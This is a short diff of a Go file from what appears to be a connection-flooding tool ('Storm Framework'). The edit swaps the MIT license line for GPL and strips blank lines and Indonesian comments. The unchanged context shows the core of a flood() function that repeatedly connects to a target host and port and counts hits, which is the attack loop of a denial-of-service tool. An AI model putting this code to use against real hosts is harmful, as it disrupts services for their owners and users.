@@ -1,8 +1,6 @@
-// MIT License.
+// GPL License.
 // Copyright (c) 2026 Storm Framework
-
 // See LICENSE file in the project root for full license information.
-
 package main
 import (
 	"flag"
@@ -21,10 +19,7 @@ func flood(target string, port int, wg *sync.WaitGroup) {
 		if err != nil {
 			continue
 		}
-
 		conn.Write([]byte("USER test connection 0a000128 0x0000\r\n"))
-
-		// Tambah hitungan setiap kali koneksi berhasil
 		atomic.AddUint64(&count, 1)
 		conn.Close()
 	}
@@ -41,7 +36,6 @@ func main() {
 		return
 	}
 
-	// Goroutine khusus untuk cetak log real-time setiap 1 detik
 	go func() {
 		for {
 			current := atomic.LoadUint64(&count)
